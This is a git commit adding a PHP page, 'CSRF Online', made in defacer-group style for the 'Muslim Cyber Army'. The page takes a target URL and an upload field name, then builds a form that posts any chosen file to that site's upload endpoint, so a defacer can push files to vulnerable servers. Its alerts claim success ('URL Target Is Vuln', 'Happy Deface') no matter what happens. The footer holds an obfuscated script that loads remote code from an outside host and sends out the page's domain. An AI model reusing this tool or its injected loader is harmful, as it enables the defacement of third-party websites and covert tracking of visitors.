564d55686b36cdb81195344ecb2fe8ab9305118c
mankaguz <81649315+mankaguz@users.noreply.github.com>
2021-04-21 17:29:58 +0700

    Add files via upload

---
+++ views/about.php
@@ -0,0 +1,131 @@
+<html>
+ <!--Lammer Mau Ngapain?Mau Ngambil? Ya Modal Ngoding LahXixixixixixiNamanya Juga LammerGak Modal:vCreated By=MR'AGZ69-->
+ <head> 
+  <title>CSRF Online</title> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+  <meta content="MR'AGZ69" name="description"> 
+  <meta content="MR'AGZ69" name="keywords"> 
+  <meta property="og:image" content="https://i.ibb.co/hCPjQ48/me.jpg" "="">
+     <link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Rancho" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet" type="text/css">
+  
+         <link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet"> 
+         <link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet" type="text/css">
+         <link href="http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700" rel="stylesheet" type="text/css"> 
+         <meta content='CSRF Online' name='title'/>
+         <meta content='CSRF Online' name='description'/>
+         <meta content='CSRF Online' name='keywords'/>
+         <meta content='CSRF Online' name='Abstract'/>
+         <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+          <link rel="icon" type="image/png" href="https://cdn.pixabay.com/photo/2013/07/13/13/41/bash-161382_960_720.png">
+             
+  <style>body {		background: linear-gradient(to right bottom, #B721FF, #2AF598, #fec051, #FEE140, #FA709A );	background-size: cover;	background-repeat: repeat;}
+body:before{	content:'';	position: center;	top: 0;	bottom: 0;	width: 100%;	z-index: -5;	background: linear-gradient(to bottom, rgba(255,255,255,0.7), #21D4FD 10%); display:block;}
+body {	margin: 2%;	font-size: 1.15em;	line-height: 1.4em;}
+#container {	background-color: black;	margin: 50px 7%;	padding: 30px 60px;	border-radius: 20px;	box-shadow: 3px 5px 30px 1 rgba(0,0,0,0.20); }
+main,header {	box-sizing: border-box;}
+main {	background-color:black;	padding: 7%;	border-radius: 35px;	color: black;	margin: 3px 0; }
+.ngekotak {box-sizing: border-box;margin: 1em auto;line-height:5%;background-color:black;outline: inset 9px red;padding: 0.75em;max-width: 200em;width: 100%;font: 900 1.45em Orbitron ;counter-increment: c;}
+.kotakan {box-sizing: border-box;margin: 1em auto;line-height:5%;background-color:black;outline: solid 9px green;padding: 0.70em;max-width: 200em;width: 100%;font: 900 1.35em VT323 ;counter-increment: c;}.content { font-family: 'Orbitron'; font-size: 60px; font-weight: bold; color: lime; position: relative;}@keyframes glitch-anim-1 { 0% { clip: rect(65px, 1084px, 115px, 0); } 5.8823529412% { clip: rect(87px, 1084px, 28px, 0); } 11.7647058824% { clip: rect(92px, 1084px, 102px, 0); } 17.6470588235% { clip: rect(63px, 1084px, 65px, 0); } 23.5294117647% { clip: rect(48px, 1084px, 64px, 0); } 29.4117647059% { clip: rect(11px, 1084px, 90px, 0); } 35.2941176471% { clip: rect(22px, 1084px, 51px, 0); } 41.1764705882% { clip: rect(109px, 1084px, 111px, 0); } 47.0588235294% { clip: rect(56px, 1084px, 73px, 0); } 52.9411764706% { clip: rect(45px, 1084px, 19px, 0); } 58.8235294118% { clip: rect(5px, 1084px, 3px, 0); } 64.7058823529% { clip: rect(93px, 1084px, 33px, 0); } 70.5882352941% { clip: rect(50px, 1084px, 107px, 0); } 76.4705882353% { clip: rect(30px, 1084px, 106px, 0); } 82.3529411765% { clip: rect(36px, 1084px, 3px, 0); } 88.2352941176% { clip: rect(113px, 1084px, 56px, 0); } 94.1176470588% { clip: rect(19px, 1084px, 26px, 0); } 100% { clip: rect(19px, 1084px, 69px, 0); }}@keyframes glitch-anim-2 { 0% { clip: rect(103px, 1084px, 91px, 0); } 5.8823529412% { clip: rect(51px, 1084px, 83px, 0); } 11.7647058824% { clip: rect(97px, 1084px, 36px, 0); } 17.6470588235% { clip: rect(36px, 1084px, 115px, 0); } 23.5294117647% { clip: rect(67px, 1084px, 22px, 0); } 29.4117647059% { clip: rect(69px, 1084px, 49px, 0); } 35.2941176471% { clip: rect(96px, 1084px, 39px, 0); } 41.1764705882% { clip: rect(90px, 1084px, 19px, 0); } 47.0588235294% { clip: rect(2px, 1084px, 19px, 0); } 52.9411764706% { clip: rect(70px, 1084px, 90px, 0); } 58.8235294118% { clip: rect(49px, 1084px, 102px, 0); } 64.7058823529% { clip: rect(98px, 1084px, 3px, 0); } 70.5882352941% { clip: rect(105px, 1084px, 48px, 0); } 76.4705882353% { clip: rect(85px, 1084px, 63px, 0); } 82.3529411765% { clip: rect(1px, 1084px, 5px, 0); } 88.2352941176% { clip: rect(33px, 1084px, 18px, 0); } 94.1176470588% { clip: rect(82px, 1084px, 20px, 0); } 100% { clip: rect(115px, 1084px, 66px, 0); }}.content:before,.content:after { content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; background: black; clip: rect(0, 0, 0, 0);}.content:after { left: 1px; text-shadow: 1px 0 red; animation: glitch-anim-1 1s infinite linear alternate-reverse;}.content:before { left: -2px; text-shadow: 2px 0 blue; animation: glitch-anim-2 3s infinite linear alternate-reverse;}
+h1{-webkit-text-stroke-width: 3px; -webkit-text-stroke-color: red; }
+.kedip {-webkit-animation-name: blinker;-webkit-animation-duration: 3s;-webkit-animation-timing-function: linear;-webkit-animation-iteration-count: infinite;
+-moz-animation-name: blinker;-moz-animation-duration: 1s;-moz-animation-timing-function: linear;-moz-animation-iteration-count: infinite;
+animation-name: blinker; animation-duration: 1s; animation-timing-function: linear; animation-iteration-count: infinite;
+color: white;}
+@-moz-keyframes blinker { 0% { opacity: 1.0; } 50% { opacity: 0.0; } 100% { opacity: 1.0; } }
+@-webkit-keyframes blinker { 0% { opacity: 1.0; } 50% { opacity: 0.0; } 100% { opacity: 1.0; } }
+@keyframes blinker { 0% { opacity: 1.0; } 50% { opacity: 0.0; } 100% { opacity: 1.0; } }.njedul {	-webkit-animation: njedul 3s cubic-bezier(0.215, 0.610, 0.355, 1.000) both;	 animation: njedul 15s cubic-bezier(0.215, 0.610, 0.355, 1.000) both;}@-webkit-keyframes njedul { 0% { letter-spacing: 1em; -webkit-transform: translateZ(400px) translateY(300px); transform: translateZ(400px) translateY(300px); opacity: 0; } 10% { opacity: 0.1;} 20% { opacity: 0.2;} 30% { opacity: 0.3;} 40% { opacity: 0.4;} 50% { opacity: 0.5;} 60% { opacity: 0.6;} 70% { opacity: 0.7;} 80% { opacity: 0.8;} 90% { opacity: 0.9;} } 100% { -webkit-transform: translateZ(0) translateY(0); transform: translateZ(0) translateY(0); opacity: 1; }}@keyframes njedul { 0% { letter-spacing: 1em; -webkit-transform: translateZ(400px) translateY(300px); transform: translateZ(400px) translateY(300px); opacity: 0; } 40% { opacity: 0.6; } 100% { -webkit-transform: translateZ(0) translateY(0); transform: translateZ(0) translateY(0); opacity: 1; }}</style>
+ </head> 
+ <!--MR'AGZ69-->
+ <body>
+  <div class="container">
+   <main>
+    <center>
+     <hr>
+     <font face="Rancho"><h1 class="njedul" style="margin:0; font-size:120px; line-height:250px; font-weight:bold;">PUNTEN:V</h1></font>
+     <marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="2" width="100%">
+      <font color="AQUA" face="monospace" size="4px">_________________________________________________________________________________________</font>
+     </marquee>
+     <br>
+     <br>
+     <font face="Rancho"></font>
+     <header>
+      <font size="7pz" face="Rancho"> 
+       <div class="content" data-text="FUCKED">
+       Muslim Cyber Army
+       </div></font>
+     </header>
+     <br>
+     <marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="2" width="100%">
+      <font color="AQUA" face="monospace" size="4px">_________________________________________________________________________________________</font>
+     </marquee>
+     <br>
+     <marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="2" width="100%">
+          <font color="AQUA" face="monospace" size="4px">_________________________________________________________________________________________</font>
+         </marquee><br><img src="https://i.ibb.co/BV58HmG/IMG-20200425-005620.png"><br><marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="2" width="100%">
+          <font color="AQUA" face="monospace" size="4px">_________________________________________________________________________________________</font>
+         </marquee>
+     <br>
+     <span style="color: rgb(242, 239, 239);">
+                            <br>
+                               <span style="font-family: monospace;"></head>
+                               <center> 
+                               <div class="error">
+                                  <img src="https://i.ibb.co/LYJHp70/20200326-181432.png" height="250px" width="250px">Feat</font><img src="https://i.ibb.co/hCPjQ48/me.jpg" width="250px" height="250px"><br><progress></progress>
+                                     <br>
+									 <audio autoplay="autoplay" controls="controls" src="https://e.top4top.io/m_15650pw650.mp3" type="audio/mpeg"></audio>
+									 <br>
+                                        <font size="4" face="Terminal">
+                                      <br>                                                                         </br>
+                                           <font size="4" face="Terminal">
+                                              
+                                           </font></p>
+                                           <font size="7" color="AQUA"> &#1203;&#824;&#1202;&#824;&#1203; </font><div class="kedip"><font size="7" color="red">CSRF Online</font></div><font size="7" color="AQUA"> &#1203;&#824;&#1202;&#824;&#1203; </font>
+                                           </p>
+                                           <font size="4" face="Ubuntu Mono"></font></p>
+                                           <font size="4" face="Ubuntu Mono"># Welocome To CSRF Online#</font></p>
+                                           <font size="4" face="Ubuntu Mono">Hopefully Your Target Vuln</font></p>
+										   <font size="4" face="Ubuntu Mono">#Awali Dengan Bismilah:v#</font></p>
+                                           <br>
+                                <div style="display">		
+                                               <center>
+<form method="post">
+<font face="Inconsolata" color="white"> URL Target : </font> <font color="AQUA"> &#1203;&#824;&#1202;&#824;&#1203; </font> <input type="text" name="url" placeholder="Your Target" style="margin: 5px auto; padding-left: 5px;" required>
+<br><br><font face="Inconsolata" color="white"> Post File : </font> <font color="AQUA">&#1203;&#824;&#1202;&#824;&#1203; </font><font color="black">-</font>  <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" required>
+<br><br><input type = "submit" name = "submit" value = "Lock Target Cuk" class="login-input"style='width: 130px; height: 40px;'> </ form >
+</form>
+<?php
+$url = $_POST['url'];
+$pf = $_POST['pf'];
+$d = $_POST['submit'];
+if($d) {
+	echo "<SCRIPT language='JavaScript'>alert('URL Target Is Vuln');</SCRIPT>";
+    echo "<SCRIPT language='JavaScript'>alert('Upload Your File');</SCRIPT>";
+	echo "<SCRIPT language='JavaScript'>alert(' Status : Terkunci');</SCRIPT>";
+    echo "<SCRIPT language='JavaScript'>alert('Akses Your File');</SCRIPT>";
+    echo "<SCRIPT language='JavaScript'>alert('Edit Page Index Done');</SCRIPT>";
+    echo "<SCRIPT language='JavaScript'>alert('Miror -> Ok');</SCRIPT>";
+    echo "<SCRIPT language='JavaScript'>alert('Happy Deface';</SCRIPT>";
+    echo " <div id='preloader'> ";
+    echo " <div id='loading'> ";
+    echo " </div> </div> ";
+    echo " <div class='content'> ";
+    echo " </div> ";
+	echo "<img src='https://i.ibb.co/LYJHp70/20200326-181432.png' style='width: 120px; height: 80px';>";
+	echo "<br>";
+        echo " <font face='Inconsolata' color='AQUA'> $url  Status -> </font> <font face='Inconsolata' color='green'> Locked </font> ";
+        echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><font face='Inconsolata' color='white'> Filename : </font><font color=black>&#1203;&#824;&#1202;&#824;&#1203;</font><input type='file' name='$pf'><input type='submit' name='submit' value=' Gasken!!!' class='login-input' style='width: 120px; height: 42px;'></form";
+}
+?>
+</form>
+<script src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
+    <script type="text/javascript">
+  $(window).load(function() {
+   $("#content").fadeOut();
+   $("#preloader").delay(10).fadeOut("slow");
+  })
+    </script>
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m1yEw0Zhss6dvuHT13xMZiBN37rSBhkrd%2fCI6B%2fO93ucRMvQCK4bk0WK%2bjVW9CZiim%2buqGrq0rZWmRqTaXCl13wBkXBaFmn5VyZYrEN%2brCEiUUv6PpHM%2fO5GRaJa2GVhiytVD8xjnt2oLcufZ12xvW1ulina2Rp%2fKFtFfU2SOAaIpMUNhsEmcAANAx2xbX0gOAEQ39FTx4l%2b0avPk9KlsWYDybRimp4YVR4x8vs8IvKwzsnHbA4dlWic8yZqScxxsiZE7U7iKfHuK%2fLHrPzq16ygpWj2dgoty%2fPbhMCbBJ%2bSGQdnm41dFpHbMOGKCs1X4kALbvo7%2ftcjaSsFbm0rhPdmmhoNlTYzqlUzBbkmagEbYz7suV%2buW3HhiNKdlobKcd7TUXRwV2tuumevdkz6ByjBcGh%2fc%2brHEE%2fvTuIcIk0NZbLPmDVwqbIWaWC7eeWDiuPN7cuMK%2fUHyQtdhDdTFbdyu7aa7XDtY7P3ptscirhAEN7wf3287hvdZJzqCj1clRB1X1N9EaytwJv3rBiqZJESyMLFie3VfNGJGpwGfypQCe%2bX4jNF5KYKZNxbbqFAK8rjFbeqRT%2fdTawUgcFBBww%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
